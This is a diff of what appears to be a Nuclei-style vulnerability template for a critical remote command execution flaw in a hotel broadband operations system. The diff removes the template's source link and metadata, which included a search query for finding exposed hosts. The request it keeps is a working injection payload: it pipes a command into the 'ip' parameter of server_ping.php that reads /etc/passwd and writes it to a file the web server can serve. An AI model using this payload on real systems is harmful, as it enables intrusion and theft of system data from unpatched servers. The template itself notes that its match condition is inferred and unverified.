@@ -3,14 +3,8 @@ info:
   name: 酒店宽带运营系统server_ping远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ac1f5f1c331523a495b010f4f6958e6b
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ac1f5f1c331523a495b010f4f6958e6b
-    fofa: + fofa`"酒店宽带运营"`
 http:
 - raw:
   - 'GET /manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../stc.txt&id=1 HTTP/1.1
